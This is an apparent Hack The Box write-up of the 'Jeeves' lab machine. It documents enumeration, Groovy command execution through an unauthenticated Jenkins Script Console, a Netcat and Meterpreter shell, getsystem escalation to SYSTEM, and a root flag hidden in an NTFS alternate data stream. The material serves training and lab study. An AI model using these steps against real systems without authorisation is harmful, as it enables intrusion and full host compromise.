---
title: 'HTB Jeeves: Complete Evidence-Led Walkthrough'
description: Deep web directory discovery exposed an unauthenticated Jenkins Script Console, followed by SYSTEM escalation and alternate-data-stream flag discovery.
date: 2026-11-12
category: Windows / Web Security
difficulty: Not recorded
tags:
- Hack The Box
- Windows
- Jenkins
- Groovy
- Web Enumeration
- Meterpreter
- NTFS ADS
published: true
slug: htb-jeeves
---

# Overview

**Machine:** Jeeves  
**Platform:** Hack The Box  
**Publication format:** htb-jeeves.md  

A short content-discovery scan missed the decisive Jenkins application under a non-obvious path. A longer wordlist found it, converting the initially sparse web surface into a practical foothold.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Target IP:** `10.129.228.112`\
**Platform:** Hack The Box\
**Operating system:** Windows\
**Status:** Rooted --- `NT AUTHORITY\SYSTEM`\
**Approach:** Independent enumeration; no published walkthroughs used\
**Primary lessons:** Long-wordlist directory discovery, exposed Jenkins
Script Console, Windows command execution, impersonation privileges, and
NTFS Alternate Data Streams (ADS).

> This write-up records the path we actually followed. Commands and
> results are separated from hypotheses. A technique that worked on this
> host should not be assumed to work on every Jenkins or Windows system.

------------------------------------------------------------------------

### Executive Summary

Jeeves exposed four TCP ports: HTTP on 80, MSRPC on 135, SMB on 445, and
HTTP on 50000. The IIS site on port 80 initially looked almost empty. A
short directory scan found only `index.html` and `error.html`, while the
longer DirBuster list eventually revealed the hidden `/askjeeves/`
context on port 50000.

That context hosted Jenkins 2.87. The Jenkins Script Console was
accessible without authentication and accepted arbitrary Groovy, which
allowed operating-system commands to run as `jeeves\kohsuke`. A Netcat
reverse shell was established, then Meterpreter was used to obtain a
more capable session. Meterpreter's `getsystem` succeeded through a
named-pipe impersonation technique, resulting in `NT AUTHORITY\SYSTEM`.

The root flag was not stored as an ordinary file named `root.txt`. On
the Administrator Desktop, `hm.txt` had an alternate NTFS data stream
named `root.txt`. `dir /r` revealed it.

**Key operational lesson:** use long directory wordlists when
enumerating web applications. The short scan missed the non-obvious
Jenkins context path; `directory-list-2.3-medium.txt` found it.

------------------------------------------------------------------------

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Initial Reconnaissance

#### Full TCP port scan

Initial scan results:

         Port State   Initial service label
  ----------- ------- -----------------------------------
       80/tcp Open    HTTP
      135/tcp Open    MSRPC
      445/tcp Open    Microsoft-DS / SMB
    50000/tcp Open    Initially identified as `ibm-db2`

The first service label on port 50000 was misleading. Service detection
later correctly identified HTTP running Jetty.

#### Targeted service scan

Command:

``` bash
sudo nmap -sC -sV -O -p80,135,445,50000 10.129.228.112 -oN targeted.txt
```

Relevant results:

``` text
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

Additional observations:

-   HTTP title on port 80: `Ask Jeeves`
-   Server header on port 80: `Microsoft-IIS/10.0`
-   Server header on port 50000: `Jetty(9.4.z-SNAPSHOT)`
-   SMB anonymous session setup failed with `NT_STATUS_ACCESS_DENIED`.
-   SMB signing was enabled but not required according to Nmap's SMB2
    script output.
-   OS fingerprinting was inconclusive, so the guessed OS version was
    not treated as definitive.

SMB command:

``` bash
smbclient -L //10.129.228.112 -N
```

Result:

``` text
session setup failed: NT_STATUS_ACCESS_DENIED
```

This only established that anonymous session setup/listing failed; it
did not prove that every SMB operation or share was inaccessible with
valid credentials.

------------------------------------------------------------------------

### Web Enumeration

#### Port 80 --- IIS

The landing page was titled `Ask Jeeves` and contained a minimal search
form:

``` html
<form class="form-wrapper cf" action="error.html">
    <div class="byline"><p><a href="#">Web</a>, <a href="#">images</a>, <a href="#">news</a>, and <a href="#">lots of answers</a>.</p></div>
    <input type="text" placeholder="Search here..." required>
    <button type="submit">Search</button>
    <div class="byline-bot">Skins</div>
</form>
```

The input had no `name` attribute. The form's default method was GET,
and submitting it navigated to `error.html`. The request was observed
as:

``` http
GET /error.html? HTTP/1.1
Host: 10.129.228.112
```

#### The SQL Server-looking error image

The page at `/error.html` returned a short HTML body embedding
`jeeves.PNG`:

``` html
<img src="jeeves.PNG" width="90%" height="100%">
```

The image displayed an ASP.NET/SQL Server exception, including
references to SQL Server 2005, an `nvarchar`-to-`int` conversion error,
and application symbols such as `DisciplineSelect.ascx`, `TriggerCode`,
and `Generic DataAccess.cs`.

We initially considered whether this indicated SQL injection. Direct
requests to `/error.html` returned the same static HTML embedding the
image, regardless of whether a query string was added. The error was
therefore **not evidence of a live SQL injection point**. The image was
a static asset, and no SQL injection was established.

Image metadata inspection showed a 1212 × 804 PNG with a file
modification date of 2017-11-06. No meaningful EXIF clue was identified.

#### Short directory enumeration was insufficient

WhatWeb confirmed:

``` text
HTTPServer[Microsoft-IIS/10.0]
Title[Ask Jeeves]
```

Requests for `robots.txt`, `sitemap.xml`, and `web.config` returned
standard IIS 404 pages.

A short IIS scan found only:

``` text
/error.html   (Status: 200) [Size: 50]
/index.html   (Status: 200) [Size: 503]
```

This did not reveal the useful application context. The IIS site was
deprioritized after these results.

#### Port 50000 --- Jetty

The root path returned Jetty's generic `404 Not Found` response.
Requests to `/robots.txt`, `/favicon.ico`, and `/WEB-INF/web.xml` also
returned 404.

Two URI-encoding tests inspired by public Jetty `WEB-INF` disclosure
research also returned the same 404. No disclosure was demonstrated, and
the banner `Jetty(9.4.z-SNAPSHOT)` alone was not sufficient to establish
an exact vulnerable version.

The crucial discovery came from using the longer DirBuster wordlist:

``` text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This revealed:

``` text
/askjeeves/
```

**Lesson:** a root 404 and an empty short scan do not mean a web service
has no application. It may be deployed under an application context
path.

------------------------------------------------------------------------

## Analysis

The apparent service label on TCP/50000 was misleading; version detection and web enumeration established Jetty and Jenkins. Unrestricted Groovy script execution provided command execution as kohsuke. Meterpreter impersonation then produced NT AUTHORITY\SYSTEM. The Administrator flag location required enumeration of NTFS alternate data streams rather than assuming a conventional root.txt file.

### Attack Chain Summary

1.  Scanned all TCP ports and identified 80, 135, 445, and 50000.
2.  Fingerprinted services; corrected the initial misleading service
    label on 50000 to Jetty HTTP.
3.  Enumerated IIS and found only a minimal static page and error image.
4.  Avoided treating the static SQL exception image as proof of SQL
    injection.
5.  Used a longer directory wordlist to discover `/askjeeves/` on port
    50000.
6.  Found Jenkins 2.87 and an anonymously accessible Script Console.
7.  Executed Groovy and Windows commands as `jeeves\kohsuke`.
8.  Established a Netcat reverse shell, then a Meterpreter session.
9.  Enumerated local privileges and observed `SeImpersonatePrivilege`.
10. Used Meterpreter `getsystem`; verified `NT AUTHORITY\SYSTEM`.
11. Used `dir /r` on the Administrator Desktop to discover
    `hm.txt:root.txt:$DATA`.
12. Read the root flag from the alternate data stream.

------------------------------------------------------------------------

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Jenkins Discovery and Initial Access

The application was accessible at:

``` text
http://10.129.228.112:50000/askjeeves/
```

It presented a Jenkins dashboard. The page exposed links including
Manage Jenkins, Credentials, People, Build History, and New Item. We
then found that the Script Console was accessible without
authentication.

Jenkins displayed the following guidance: arbitrary Groovy scripts could
be entered and executed on the server, and Jenkins-related classes were
pre-imported.

#### Verify Jenkins version and command execution

Groovy script:

``` groovy
println("Jenkins version: " + Jenkins.instance.version)
println(["cmd", "/c", "whoami"].execute().text)
```

Output:

``` text
Jenkins version: 2.87
jeeves\kohsuke
```

This confirmed arbitrary Groovy execution and Windows command execution
in the Jenkins service context.

#### Initial account and profile enumeration

Commands executed through Groovy included:

``` cmd
hostname
echo %USERPROFILE%
net user kohsuke
dir C:\Users\kohsuke
```

Observed:

-   Hostname: `Jeeves`
-   Profile: `C:\Users\kohsuke`
-   Local group membership: `Users`
-   The account was active and had no configured account expiration.
-   The profile contained standard user folders and a `.groovy`
    directory.
-   `C:\Users\kohsuke\Documents\CEH.kdbx` existed. This KeePass database
    was noted as an interesting artifact, but it was not needed for the
    successful escalation chain documented here.

Target architecture was confirmed as 64-bit using:

``` cmd
wmic os get osarchitecture
```

------------------------------------------------------------------------

### Shell Access

A reverse Netcat shell was established back to the Parrot HTB VPN
address:

``` text
10.10.15.31
```

The listener received a connection from the target:

``` text
Connection received on 10.129.228.112 49704
```

The shell ran as `jeeves\kohsuke`. Some attempts to start a payload from
the Jenkins console returned a Windows `CreateProcess error=1450`
("Insufficient system resources exist to complete the requested
service"). The Netcat shell was eventually obtained and used for local
enumeration.

#### Meterpreter

Meterpreter was later established as a more capable session. The
shell-to-Meterpreter transfer was not a direct conversion of the raw
Netcat connection; a separate payload/session was launched and caught by
Metasploit.

The important point is that the Netcat shell and Meterpreter session
were distinct sessions. Keeping a working shell as a fallback was useful
while establishing the more capable session.

------------------------------------------------------------------------

### Windows Enumeration

The following findings were collected during local enumeration:

-   User context: `jeeves\kohsuke`
-   Host: `Jeeves`
-   Profile: `C:\Users\kohsuke`
-   Local group membership: `Users`
-   OS architecture: 64-bit
-   `SeImpersonatePrivilege`: enabled
-   `SeChangeNotifyPrivilege`: enabled
-   Other listed privileges included `SeShutdownPrivilege`,
    `SeUndockPrivilege`, `SeCreateGlobalPrivilege`,
    `SeIncreaseWorkingSetPrivilege`, and `SeTimeZonePrivilege`; several
    were disabled.

Relevant privilege output:

``` text
Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The enabled `SeImpersonatePrivilege` was an important clue. It did not,
by itself, prove that a particular escalation would succeed, but it was
consistent with the later successful impersonation-based escalation.

We also enumerated user directories and checked for alternate data
streams. The initial checks of Kohsuke's Desktop, Documents, and
Downloads did not reveal any alternate streams. A standard directory
listing showed:

``` text
C:\Users\kohsuke\Documents\CEH.kdbx
```

The Administrator profile existed, but the initial manual attempt to
access its Desktop used an incorrect path/command sequence and returned
`File Not Found`. We later inspected the correct Administrator Desktop
path through the elevated Meterpreter session.

------------------------------------------------------------------------

### Privilege Escalation to SYSTEM

In Meterpreter, the following command succeeded:

``` text
getsystem
```

Result:

``` text
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Verification:

``` text
getuid
```

Output:

``` text
Server username: NT AUTHORITY\SYSTEM
```

This confirmed successful privilege escalation to the Windows SYSTEM
account.

The successful technique was Meterpreter's named-pipe impersonation
(PrintSpooler variant). The earlier `SeImpersonatePrivilege` finding was
relevant context, but the exact successful method was confirmed by
Meterpreter's output.

------------------------------------------------------------------------

### Root Flag --- NTFS Alternate Data Stream

After obtaining SYSTEM, we inspected:

``` text
C:\Users\Administrator\Desktop
```

A normal listing showed `hm.txt` and a shortcut named
`Windows 10 Update Assistant.lnk`. The critical output came from:

``` cmd
dir /r C:\Users\Administrator\Desktop
```

Result:

``` text
Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
```

The significant entry was:

``` text
hm.txt:root.txt:$DATA
```

This means `hm.txt` had an alternate NTFS data stream named `root.txt`.
It was not a separate ordinary file called `root.txt`, which explains
why a normal directory listing did not show it.

To read the stream from CMD:

``` cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

The stream contents provide the root flag. The flag value itself is
intentionally not reproduced in this document.

#### ADS notes

-   NTFS supports multiple named data streams associated with a file.
-   `dir /r` is a useful built-in command for enumerating alternate
    streams.
-   The syntax `filename:streamname` accesses a named stream.
-   Finding an ADS is not automatically an escalation. In this case, the
    stream was the location of the root flag.

------------------------------------------------------------------------

### Commands Worth Keeping in the Field Manual

#### Network and service discovery

``` bash
nmap -p- --min-rate 2000 -T4 10.129.228.112 -oN all-ports.txt
sudo nmap -sC -sV -O -p80,135,445,50000 10.129.228.112 -oN targeted.txt
```

#### Long-wordlist content discovery

``` bash
gobuster dir \
  -u http://10.129.228.112:50000/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o jetty-medium.txt
```

#### Windows identity and privilege enumeration

``` cmd
whoami
whoami /all
whoami /priv
hostname
systeminfo
```

#### NTFS alternate data stream enumeration

``` cmd
dir /r C:\Users\Administrator\Desktop
```

#### Read a named data stream

``` cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

------------------------------------------------------------------------

## Impact

A SYSTEM context and the root flag stored in hm.txt:root.txt:$DATA were verified in the source.

### Final Assessment

Jeeves reinforced several useful habits:

-   Use thorough content discovery; do not stop after a short wordlist.
-   Validate service fingerprints instead of trusting an initial port
    label.
-   Distinguish static clues from live vulnerabilities.
-   Treat anonymous Jenkins Script Console access as a serious
    command-execution finding.
-   Enumerate Windows privileges and verify the resulting security
    context.
-   Remember that NTFS alternate data streams can hide data from
    ordinary listings.

**Final status:** SYSTEM access verified, root-flag stream located, and
the independent enumeration path documented.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Pitfalls and Lessons Learned

#### Pitfall 1 --- Using short wordlists and stopping too early

**Always use long wordlists for web content discovery.**

The short scan against port 80 found only `/error.html` and
`/index.html`. The useful Jenkins application was deployed at
`/askjeeves/` on port 50000 and was found using:

``` text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A small wordlist can be useful for a quick first pass, but it must not
be treated as exhaustive. When a service is clearly running but the root
path returns 404, try a larger list and consider application context
paths.

#### Pitfall 2 --- Trusting the service name from a fast scan

The initial scan labelled port 50000 as `ibm-db2`. Version detection
identified Jetty. Always validate interesting ports with `-sV` and,
where appropriate, inspect the service directly.

#### Pitfall 3 --- Assuming an error image proves SQL injection

The SQL Server-looking error was part of a static PNG displayed by
`error.html`. The direct HTTP response served an image tag, and we did
not establish an injectable parameter. Error text can provide context,
but it must be tied to a reproducible, live request before being treated
as a vulnerability.

#### Pitfall 4 --- Assuming a web server's root 404 means there is no application

Jetty returned a default 404 at `/`, `/robots.txt`, `/favicon.ico`, and
`/WEB-INF/web.xml`. The actual application was under `/askjeeves/`.
Enumerate context paths instead of assuming everything must be deployed
at the root.

#### Pitfall 5 --- Spending too long on an unconfirmed vulnerability hypothesis

The Jetty `WEB-INF` disclosure idea was tested, but the target returned
404 for the baseline and encoded-path tests. No disclosure was
demonstrated. Record the result, then move on when the evidence is weak.

#### Pitfall 6 --- Mixing up shell connectivity and shell usability

A TCP connection reaching Netcat did not guarantee a stable, interactive
shell. Confirm that the connection stays open and test commands in the
listener session. Keep a known-good fallback shell when attempting a
replacement session.

#### Pitfall 7 --- Treating `SeImpersonatePrivilege` as automatic SYSTEM access

The privilege was an important clue, but the actual escalation was only
confirmed when Meterpreter reported that `getsystem` succeeded and
`getuid` returned `NT AUTHORITY\SYSTEM`.

#### Pitfall 8 --- Looking only for ordinary files

The root flag was stored in an alternate data stream attached to
`hm.txt`. A normal `dir` listing would not show it. Use `dir /r` when
investigating NTFS streams, especially when a lab explicitly hints at
ADS.

#### Pitfall 9 --- Assuming the intended path is the only useful path

Meterpreter's `getsystem` achieved SYSTEM before we had finished
investigating the ADS hint. The successful escalation and the
flag-storage clue were related to different lessons: one concerned
privilege escalation, the other concerned NTFS alternate streams.
Document both, and distinguish the route that worked from other clues on
the machine.

#### Pitfall 10 --- Repeating failed transfer attempts without checking the cause

Payload download and execution attempts produced a Windows
`CreateProcess error=1450`, and a later download did not create the
expected file. Check the HTTP server logs, verify the source file and
destination, and confirm the result with `dir` before attempting
execution. Avoid assuming that a command succeeded simply because it
returned to a prompt.

------------------------------------------------------------------------
